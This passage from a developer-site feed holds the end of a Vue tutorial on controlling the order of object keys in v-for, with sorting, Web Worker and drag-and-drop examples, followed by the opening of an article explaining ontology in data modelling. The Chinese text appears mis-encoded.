      comparison = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(valueA).<span class="hljs-title function_">localeCompare</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(valueB))
    }
    
    <span class="hljs-keyword">return</span> order === <span class="hljs-string">'desc'</span> ? -comparison : comparison
  })
  
  <span class="hljs-comment">// è½¬æ¢å›å¯¹è±¡</span>
  <span class="hljs-keyword">const</span> result = {}
  entries.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">[key, value]</span>) =&gt;</span> {
    result[key] = value
  })
  
  <span class="hljs-keyword">return</span> result
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">calculateWeight</span>(<span class="hljs-params">key, value</span>) {
  <span class="hljs-comment">// å¤æ‚çš„æƒé‡è®¡ç®—</span>
  <span class="hljs-keyword">let</span> weight = <span class="hljs-number">0</span>
  weight += key.<span class="hljs-property">length</span> * <span class="hljs-number">10</span>
  weight += <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(value).<span class="hljs-property">length</span>
  <span class="hljs-keyword">return</span> weight
}
</code></pre>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div&gt;
    &lt;h3&gt;æ–¹æ³•9ï¼šWeb Worker åå°æ’åº&lt;/h3&gt;
    
    &lt;div v-for="(value, key) in sortedData" :key="key"&gt;
      {{ key }}: {{ value }}
    &lt;/div&gt;
    
    &lt;button @click="startComplexSort" :disabled="isSorting"&gt;
      {{ isSorting ? 'æ’åºä¸­...' : 'å¼€å§‹å¤æ‚æ’åº' }}
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
export default {
  data() {
    return {
      originalData: {
        // å¤§é‡æ•°æ®
        'item_001': { value: Math.random(), timestamp: Date.now() },
        'item_002': { value: Math.random(), timestamp: Date.now() },
        // ... æ›´å¤šæ•°æ®
      },
      sortedData: {},
      worker: null,
      isSorting: false
    }
  },
  
  created() {
    this.initWorker()
    this.sortedData = { ...this.originalData }
    
    // ç”Ÿæˆæµ‹è¯•æ•°æ®
    for (let i = 1; i &lt;= 1000; i++) {
      const key = `item_${i.toString().padStart(3, '0')}`
      this.originalData[key] = {
        value: Math.random(),
        timestamp: Date.now() - Math.random() * 1000000,
        weight: Math.random() * 100
      }
    }
  },
  
  methods: {
    initWorker() {
      if (typeof Worker !== 'undefined') {
        this.worker = new Worker('worker.js')
        
        this.worker.onmessage = (event) =&gt; {
          this.sortedData = event.data
          this.isSorting = false
          console.log('Worker æ’åºå®Œæˆ')
        }
        
        this.worker.onerror = (error) =&gt; {
          console.error('Worker é”™è¯¯:', error)
          this.isSorting = false
        }
      }
    },
    
    startComplexSort() {
      if (!this.worker) {
        console.warn('Worker ä¸æ”¯æŒï¼Œä½¿ç”¨ä¸»çº¿ç¨‹æ’åº')
        this.sortInMainThread()
        return
      }
      
      this.isSorting = true
      this.worker.postMessage({
        data: this.originalData,
        sortBy: 'complex',
        order: 'asc'
      })
    },
    
    sortInMainThread() {
      this.isSorting = true
      
      // æ¨¡æ‹Ÿå¤æ‚è®¡ç®—
      setTimeout(() =&gt; {
        const entries = Object.entries(this.originalData)
        entries.sort(([keyA, valueA], [keyB, valueB]) =&gt; {
          const weightA = keyA.length * 10 + JSON.stringify(valueA).length
          const weightB = keyB.length * 10 + JSON.stringify(valueB).length
          return weightA - weightB
        })
        
        const result = {}
        entries.forEach(([key, value]) =&gt; {
          result[key] = value
        })
        
        this.sortedData = result
        this.isSorting = false
      }, 1000)
    }
  },
  
  beforeDestroy() {
    if (this.worker) {
      this.worker.terminate()
    }
  }
}
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-17">3.10 æ–¹æ³•10ï¼šç»¼åˆè§£å†³æ–¹æ¡ˆ</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div&gt;
    &lt;h3&gt;æ–¹æ³•10ï¼šç»¼åˆè§£å†³æ–¹æ¡ˆ&lt;/h3&gt;
    
    &lt;!-- æ’åºæ§åˆ¶å™¨ --&gt;
    &lt;div class="sort-controls"&gt;
      &lt;select v-model="sortConfig.by"&gt;
        &lt;option value="key"&gt;æŒ‰é”®å&lt;/option&gt;
        &lt;option value="value"&gt;æŒ‰å€¼&lt;/option&gt;
        &lt;option value="custom"&gt;è‡ªå®šä¹‰&lt;/option&gt;
      &lt;/select&gt;
      
      &lt;select v-model="sortConfig.order"&gt;
        &lt;option value="asc"&gt;å‡åº&lt;/option&gt;
        &lt;option value="desc"&gt;é™åº&lt;/option&gt;
      &lt;/select&gt;
      
      &lt;button @click="saveSortPreference"&gt;ä¿å­˜åå¥½&lt;/button&gt;
    &lt;/div&gt;
    
    &lt;!-- æ˜¾ç¤ºæ•°æ® --&gt;
    &lt;div class="data-grid"&gt;
      &lt;div 
        v-for="item in sortedItems" 
        :key="item.id"
        class="data-item"
        :draggable="true"
        @dragstart="dragStart(item.id)"
        @dragover.prevent
        @drop="drop(item.id)"
      &gt;
        &lt;div class="item-content"&gt;
          &lt;span class="item-key"&gt;{{ item.key }}&lt;/span&gt;
          &lt;span class="item-value"&gt;{{ item.value }}&lt;/span&gt;
        &lt;/div&gt;
        &lt;div class="item-actions"&gt;
          &lt;button @click="moveUp(item.id)"&gt;â†‘&lt;/button&gt;
          &lt;button @click="moveDown(item.id)"&gt;â†“&lt;/button&gt;
        &lt;/div&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
import { throttle } from 'lodash'

export default {
  data() {
    return {
      // åŸå§‹æ•°æ®
      items: [
        { id: 'name', value: 'å¼ ä¸‰', order: 0, type: 'string' },
        { id: 'age', value: 25, order: 1, type: 'number' },
        { id: 'email', value: 'zhangsan@example.com', order: 2, type: 'string' },
        { id: 'score', value: 95, order: 3, type: 'number' },
        { id: 'active', value: true, order: 4, type: 'boolean' }
      ],
      
      // æ’åºé…ç½®
      sortConfig: {
        by: localStorage.getItem('sort_by') || 'key',
        order: localStorage.getItem('sort_order') || 'asc'
      },
      
      // æ‹–æ‹½çŠ¶æ€
      dragItemId: null
    }
  },
  
  computed: {
    // ç»¼åˆæ’åº
    sortedItems() {
      let items = [...this.items]
      
      // æŒ‰é…ç½®æ’åº
      switch (this.sortConfig.by) {
        case 'key':
          items.sort((a, b) =&gt; {
            const comparison = a.id.localeCompare(b.id)
            return this.sortConfig.order === 'asc' ? comparison : -comparison
          })
          break
          
        case 'value':
          items.sort((a, b) =&gt; {
            let comparison = 0
            
            if (a.type === 'string' &amp;&amp; b.type === 'string') {
              comparison = a.value.localeCompare(b.value)
            } else {
              comparison = a.value - b.value
            }
            
            return this.sortConfig.order === 'asc' ? comparison : -comparison
          })
          break
          
        case 'custom':
          // ä½¿ç”¨ä¿å­˜çš„é¡ºåº
          items.sort((a, b) =&gt; a.order - b.order)
          break
      }
      
      return items
    }
  },
  
  watch: {
    // ç›‘å¬æ’åºé…ç½®å˜åŒ–
    sortConfig: {
      handler: throttle(function(newConfig) {
        this.saveSortPreference()
      }, 1000),
      deep: true
    }
  },
  
  methods: {
    // ä¿å­˜æ’åºåå¥½
    saveSortPreference() {
      localStorage.setItem('sort_by', this.sortConfig.by)
      localStorage.setItem('sort_order', this.sortConfig.order)
      
      // ä¿å­˜è‡ªå®šä¹‰é¡ºåº
      if (this.sortConfig.by === 'custom') {
        localStorage.setItem('custom_order', 
          JSON.stringify(this.items.map(item =&gt; item.id))
        )
      }
    },
    
    // æ‹–æ‹½ç›¸å…³
    dragStart(itemId) {
      this.dragItemId = itemId
    },
    
    drop(targetItemId) {
      if (!this.dragItemId || this.dragItemId === targetItemId) return
      
      const dragIndex = this.items.findIndex(item =&gt; item.id === this.dragItemId)
      const targetIndex = this.items.findIndex(item =&gt; item.id === targetItemId)
      
      if (dragIndex &gt; -1 &amp;&amp; targetIndex &gt; -1) {
        // äº¤æ¢é¡ºåºå€¼
        const tempOrder = this.items[dragIndex].order
        this.items[dragIndex].order = this.items[targetIndex].order
        this.items[targetIndex].order = tempOrder
        
        // åˆ‡æ¢åˆ°è‡ªå®šä¹‰æ’åº
        this.sortConfig.by = 'custom'
        
        // é‡ç½®æ‹–æ‹½çŠ¶æ€
        this.dragItemId = null
      }
    },
    
    // ç§»åŠ¨é¡¹ç›®
    moveUp(itemId) {
      const index = this.items.findIndex(item =&gt; item.id === itemId)
      if (index &gt; 0) {
        const tempOrder = this.items[index].order
        this.items[index].order = this.items[index - 1].order
        this.items[index - 1].order = tempOrder
        
        this.sortConfig.by = 'custom'
      }
    },
    
    moveDown(itemId) {
      const index = this.items.findIndex(item =&gt; item.id === itemId)
      if (index &lt; this.items.length - 1) {
        const tempOrder = this.items[index].order
        this.items[index].order = this.items[index + 1].order
        this.items[index + 1].order = tempOrder
        
        this.sortConfig.by = 'custom'
      }
    },
    
    // ä»æœ¬åœ°å­˜å‚¨åŠ è½½è‡ªå®šä¹‰é¡ºåº
    loadCustomOrder() {
      const savedOrder = localStorage.getItem('custom_order')
      if (savedOrder) {
        const orderArray = JSON.parse(savedOrder)
        
        orderArray.forEach((itemId, index) =&gt; {
          const item = this.items.find(item =&gt; item.id === itemId)
          if (item) {
            item.order = index
          }
        })
        
        // ç¡®ä¿æ‰€æœ‰é¡¹ç›®éƒ½æœ‰é¡ºåºå€¼
        this.items.forEach((item, index) =&gt; {
          if (item.order === undefined) {
            item.order = orderArray.length + index
          }
        })
      }
    }
  },
  
  mounted() {
    this.loadCustomOrder()
  }
}
&lt;/script&gt;

&lt;style scoped&gt;
.sort-controls {
  margin-bottom: 20px;
  padding: 10px;
  background: #f5f5f5;
  border-radius: 4px;
}

.sort-controls select {
  margin-right: 10px;
  padding: 5px 10px;
}

.data-grid {
  display: flex;
  flex-direction: column;
  gap: 10px;
}

.data-item {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 4px;
  background: white;
  cursor: move;
  transition: all 0.3s ease;
}

.data-item:hover {
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
}

.data-item.dragging {
  opacity: 0.5;
}

.item-content {
  display: flex;
  gap: 20px;
}

.item-key {
  font-weight: bold;
  color: #1890ff;
}

.item-value {
  color: #666;
}

.item-actions button {
  margin-left: 5px;
  padding: 2px 8px;
  border: 1px solid #ddd;
  background: white;
  cursor: pointer;
  border-radius: 2px;
}

.item-actions button:hover {
  background: #f0f0f0;
}
&lt;/style&gt;
</code></pre>
<h3 data-id="heading-18">å››ã€æ€»ç»“ä¸æœ€ä½³å®è·µ</h3>
<h4 data-id="heading-19">4.1 æ–¹æ³•é€‰æ‹©æŒ‡å—</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ ¹æ®éœ€æ±‚é€‰æ‹©åˆé€‚çš„æ–¹æ³•</span>
<span class="hljs-keyword">const</span> methodSelectionGuide = {
  <span class="hljs-comment">// ç®€å•åœºæ™¯</span>
  ç®€å•æ’åº: <span class="hljs-string">'ä½¿ç”¨è®¡ç®—å±æ€§ + Object.keys().sort()'</span>,
  
  <span class="hljs-comment">// éœ€è¦ä¿æŒæ’å…¥é¡ºåº</span>
  ä¿æŒé¡ºåº: <span class="hljs-string">'ä½¿ç”¨ Map æˆ–æ•°ç»„å­˜å‚¨'</span>,
  
  <span class="hljs-comment">// å¤§é‡æ•°æ®</span>
  å¤§æ•°æ®é‡: <span class="hljs-string">'ä½¿ç”¨ Web Worker æˆ–æœåŠ¡ç«¯æ’åº'</span>,
  
  <span class="hljs-comment">// ç”¨æˆ·è‡ªå®šä¹‰é¡ºåº</span>
  ç”¨æˆ·æ’åº: <span class="hljs-string">'ä½¿ç”¨æ‹–æ‹½ + æœ¬åœ°å­˜å‚¨'</span>,
  
  <span class="hljs-comment">// å¤æ‚ä¸šåŠ¡é€»è¾‘</span>
  å¤æ‚æ’åº: <span class="hljs-string">'ä½¿ç”¨ Lodash æˆ–è‡ªå®šä¹‰ç®—æ³•'</span>,
  
  <span class="hljs-comment">// å®æ—¶å“åº”</span>
  å®æ—¶å“åº”: <span class="hljs-string">'Vue 3 computed + å“åº”å¼'</span>,
  
  <span class="hljs-comment">// æŒä¹…åŒ–éœ€æ±‚</span>
  æŒä¹…åŒ–: <span class="hljs-string">'IndexedDB æˆ–åç«¯å­˜å‚¨'</span>
}
</code></pre>
<h4 data-id="heading-20">4.2 æ€§èƒ½ä¼˜åŒ–å»ºè®®</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. ç¼“å­˜æ’åºç»“æœ</span>
<span class="hljs-keyword">const</span> cachedSortedData = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// æ·»åŠ ç¼“å­˜é€»è¾‘</span>
  <span class="hljs-keyword">const</span> cacheKey = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(sortConfig)
  <span class="hljs-keyword">if</span> (cache[cacheKey] &amp;&amp; !dataChanged) {
    <span class="hljs-keyword">return</span> cache[cacheKey]
  }
  
  <span class="hljs-keyword">const</span> result = <span class="hljs-title function_">doComplexSort</span>(data, sortConfig)
  cache[cacheKey] = result
  dataChanged = <span class="hljs-literal">false</span>
  <span class="hljs-keyword">return</span> result
})

<span class="hljs-comment">// 2. é˜²æŠ–æ’åºæ“ä½œ</span>
<span class="hljs-keyword">const</span> debouncedSort = _.<span class="hljs-title function_">debounce</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// æ’åºé€»è¾‘</span>
}, <span class="hljs-number">300</span>)

<span class="hljs-comment">// 3. è™šæ‹Ÿæ»šåŠ¨ï¼ˆå¤§æ•°æ®é‡ï¼‰</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">VirtualScroller</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-virtual-scroller'</span>

<span class="hljs-comment">// 4. åˆ†é¡µæ’åº</span>
<span class="hljs-keyword">const</span> paginatedData = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> sorted = sortedData.<span class="hljs-property">value</span>
  <span class="hljs-keyword">const</span> start = (currentPage.<span class="hljs-property">value</span> - <span class="hljs-number">1</span>) * pageSize.<span class="hljs-property">value</span>
  <span class="hljs-keyword">const</span> end = start + pageSize.<span class="hljs-property">value</span>
  <span class="hljs-keyword">return</span> sorted.<span class="hljs-title function_">slice</span>(start, end)
})
</code></pre>
<h4 data-id="heading-21">4.3 å…³é”®ç»“è®º</h4>
<ol>
<li><strong>Vue v-for éå†å¯¹è±¡é¡ºåº</strong>ï¼šéµå¾ª JavaScript çš„ <code>Object.keys()</code> é¡ºåºè§„åˆ™</li>
<li><strong>é»˜è®¤é¡ºåº</strong>ï¼šæ•°å­—é”®æ’åº + å­—ç¬¦ä¸²é”®æ’å…¥é¡ºåº</li>
<li><strong>ä¿è¯é¡ºåºçš„æœ€ä½³å®è·µ</strong>ï¼š
<ul>
<li>å°æ•°æ®ï¼šä½¿ç”¨è®¡ç®—å±æ€§æ’åº</li>
<li>éœ€è¦é¡ºåºä¿æŒï¼šä½¿ç”¨ Map æˆ–æ•°ç»„</li>
<li>ç”¨æˆ·è‡ªå®šä¹‰ï¼šå®ç°æ‹–æ‹½æ’åº + æŒä¹…åŒ–</li>
<li>å¤§æ•°æ®ï¼šä½¿ç”¨ Web Worker æˆ–æœåŠ¡ç«¯æ’åº</li>
</ul>
</li>
</ol>
<p><strong>è®°ä½æ ¸å¿ƒåŸåˆ™</strong>ï¼šJavaScript å¯¹è±¡æœ¬èº«æ˜¯æ— åºçš„ï¼Œå¦‚æœéœ€è¦ç¡®å®šçš„éå†é¡ºåºï¼Œå¿…é¡»æ˜¾å¼åœ°ç®¡ç†é¡ºåºä¿¡æ¯ã€‚é€‰æ‹©æœ€é€‚åˆä½ åº”ç”¨åœºæ™¯çš„æ–¹æ³•ï¼Œè®©æ•°æ®å±•ç¤ºæ—¢é«˜æ•ˆåˆç¬¦åˆç”¨æˆ·æœŸæœ›ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€æ–‡è¯»æ‡‚â€œæœ¬ä½“è®ºâ€è¿™ä¸ªæ—¶é«¦è¯]]></title>    <link>https://juejin.cn/post/7595131879266435126</link>    <guid>https://juejin.cn/post/7595131879266435126</guid>    <pubDate>2026-01-15T08:59:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595131879266435126" data-draft-id="7595150851477422123" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€æ–‡è¯»æ‡‚â€œæœ¬ä½“è®ºâ€è¿™ä¸ªæ—¶é«¦è¯"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-15T08:59:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç äº‹æ¼«è°ˆ"/> <meta itemprop="url" content="https://juejin.cn/user/1972974802965230"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€æ–‡è¯»æ‡‚â€œæœ¬ä½“è®ºâ€è¿™ä¸ªæ—¶é«¦è¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972974802965230/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç äº‹æ¼«è°ˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T08:59:28.000Z" title="Thu Jan 15 2026 08:59:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>å®ƒä¸åƒAIé‚£æ ·å…‰èŠ’å››å°„ï¼Œå´æ˜¯è®©AIçœŸæ­£èªæ˜èµ·æ¥çš„â€œçŸ¥è¯†éª¨æ¶â€ã€‚</p>
</blockquote>
<p>æœ€è¿‘åœ¨ç§‘æŠ€åœˆé‡Œï¼Œâ€œæœ¬ä½“è®ºâ€è¿™ä¸ªè¯å¿½ç„¶ç«äº†èµ·æ¥ï¼Œä½†å¾ˆå¤šäººç¬¬ä¸€ååº”æ˜¯ï¼šè¿™ä¸æ˜¯å“²å­¦æ¦‚å¿µå—ï¼Ÿæ€ä¹ˆè·‘åˆ°æ•°æ®é¢†åŸŸæ¥äº†ï¼Ÿ</p>
<p>æƒ³è±¡ä¸€ä¸‹è¿™æ ·çš„åœºæ™¯ï¼šå…¬å¸å¸‚åœºéƒ¨è¯´â€œå®¢æˆ·â€ï¼Œè´¢åŠ¡éƒ¨è¯´â€œå®¢æˆ·â€ï¼Œå®¢æœéƒ¨ä¹Ÿè¯´â€œå®¢æˆ·â€ï¼Œä½†ä¸‰æ–¹æŒ‡çš„å†…å®¹å¯èƒ½å¤§ç›¸å¾„åº­â€”â€”å¸‚åœºéƒ¨æŒ‡çš„æ˜¯ä»»ä½•æ½œåœ¨è´­ä¹°è€…ï¼Œè´¢åŠ¡éƒ¨æŒ‡çš„æ˜¯å·²ä»˜æ¬¾çš„è´¦æˆ·ï¼Œå®¢æœéƒ¨æŒ‡çš„æ˜¯æè¿‡é—®é¢˜çš„äººã€‚</p>
<p>è¿™ç§<strong>åŒåä¸åŒä¹‰</strong>çš„æ··ä¹±ï¼Œå°±æ˜¯ç°ä»£ä¼ä¸šæ•°æ®ä¸–ç•Œçš„çœŸå®å†™ç…§ã€‚è€Œå½“äººå·¥æ™ºèƒ½è¯•å›¾ç†è§£è¿™äº›æ•°æ®æ—¶ï¼Œå®ƒä¼šæ›´åŠ å›°æƒ‘ï¼šåˆ°åº•ä»€ä¹ˆæ˜¯â€œå®¢æˆ·â€ï¼Ÿç­”æ¡ˆè—åœ¨æ•°æ®æœ¬ä½“è®ºä¸­ã€‚</p>
<hr/>
<h2 data-id="heading-0">01 ä»å“²å­¦åˆ°æ•°æ®ï¼šæœ¬ä½“è®ºçš„è·¨è¶Š</h2>
<p>å“²å­¦ä¸Šçš„æœ¬ä½“è®ºæ¢è®¨çš„æ˜¯â€œå­˜åœ¨æœ¬èº«â€ï¼Œç ”ç©¶ä»€ä¹ˆæ˜¯å®ä½“ï¼Œä»€ä¹ˆæ˜¯å±æ€§ï¼Œä»€ä¹ˆæ„æˆçœŸå®ã€‚2500å¹´å‰ï¼Œ<strong>äºšé‡Œå£«å¤šå¾·</strong>åœ¨ã€ŠèŒƒç•´ç¯‡ã€‹ä¸­æå‡ºåå¤§èŒƒç•´ï¼ŒåŒ…æ‹¬å®ä½“ã€æ•°é‡ã€æ€§è´¨ã€å…³ç³»ç­‰ï¼Œè¿™è¢«è®¤ä¸ºæ˜¯æœ¬ä½“è®ºæ€æƒ³çš„é›å½¢ã€‚</p>
<p>2000å¤šå¹´åï¼Œè¿™ä¸€å“²å­¦æ€æƒ³è¢«è®¡ç®—æœºç§‘å­¦å®¶â€œå€Ÿç”¨â€äº†ã€‚</p>
<p>1993å¹´ï¼Œè®¡ç®—æœºç§‘å­¦å®¶<strong>æ±¤å§†Â·æ ¼é²ä¼¯</strong>ç»™å‡ºäº†æ•°æ®é¢†åŸŸæœ¬ä½“è®ºçš„å®šä¹‰ï¼šâ€œä¸€ç§å¯¹æ¦‚å¿µåŒ–ä½“ç³»çš„æ˜ç¡®è§„èŒƒâ€ã€‚å¬èµ·æ¥æœ‰äº›æ‹—å£ï¼Œä½†ç”¨å¤§ç™½è¯è¯´å°±æ˜¯ï¼š<strong>ä¸ºæœ¬é¢†åŸŸçš„é‡è¦æ¦‚å¿µç«‹è§„çŸ©ï¼Œæ˜ç¡®å®ƒä»¬æ˜¯ä»€ä¹ˆã€æœ‰ä»€ä¹ˆå±æ€§ã€å½¼æ­¤æœ‰ä»€ä¹ˆå…³ç³»ã€‚</strong></p>
<p>å¦‚æœè¯´æ•°æ®åº“æ˜¯å­˜æ”¾æ•°æ®çš„<strong>ä»“åº“</strong>ï¼Œé‚£ä¹ˆæœ¬ä½“è®ºå°±æ˜¯è¿™ä¸ªä»“åº“çš„<strong>åˆ†ç±»ä½“ç³»å’Œæ ‡ç­¾ç³»ç»Ÿ</strong>â€”â€”å®ƒä¸åªæ˜¯å‘Šè¯‰ä½ æœ‰å¤šå°‘è´§æ¶ï¼Œè¿˜å‘Šè¯‰ä½ â€œé£Ÿå“åŒºâ€å’Œâ€œæ—¥ç”¨å“åŒºâ€çš„åŒºåˆ«ï¼Œä»¥åŠâ€œç‰›å¥¶â€ä¸ºä»€ä¹ˆæ”¾åœ¨å†·è—åŒºè€Œä¸æ˜¯ç²®æ²¹åŒºã€‚</p>
<h2 data-id="heading-1">02 ä¸ºä»€ä¹ˆä»Šå¤©çš„æ•°æ®éœ€è¦â€œæœ¬ä½“â€ï¼Ÿ</h2>
<p>åœ¨æ•°æ®é‡å°ã€ç³»ç»Ÿå°‘çš„æ—¶ä»£ï¼Œäººä»¬é€šè¿‡æ–‡æ¡£å’Œå£å¤´æ²Ÿé€šå°±èƒ½å¯¹é½æ¦‚å¿µã€‚ä½†ä»Šå¤©çš„æƒ…å†µå·²ç»å®Œå…¨ä¸åŒã€‚</p>
